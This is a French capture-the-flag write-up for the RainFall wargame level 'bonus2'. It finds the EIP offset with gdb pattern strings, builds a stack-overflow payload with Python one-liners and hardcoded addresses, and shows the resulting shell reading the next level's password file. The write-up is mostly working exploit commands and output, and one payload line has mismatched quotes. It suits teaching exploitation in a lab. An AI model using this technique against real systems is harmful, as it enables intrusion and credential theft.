# bonus2: STACK OVERFLOW

# OFFSET

```bash
(gdb) printf "%s\n", 0x804873d 
fi
```
> memcmp compare l'env ``$LANG`` avec ``fi``

_**nous allons overflow le strcat avec des paternes alpha classico**_

- **argv[1]** ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" _(76 octets)_
- **argv[2]** = "AAAABBBBCCCCDDDDEEAAAA" _(22 octets)_

```bash
Starting program: /home/user/bonus2/bonus2 $(cat /tmp/patern) $(cat /tmp/patern2)
Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEAAAAFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? () <------- EIP OFFSET !
```
# PAYLOAD

```bash
$(python -c 'print "A"*76') $(python -c 'print "A"*18' + "\x37\x86\x04\x08" + "\xc5\xfc\xff\xbf')
```
# EXEC

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*76') $(python -c 'print "A"*18 + "\x37\x86\x04\x08" + "\xc5\xfc\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

```
TADA ! PLUS QUE UN SEUL ! :)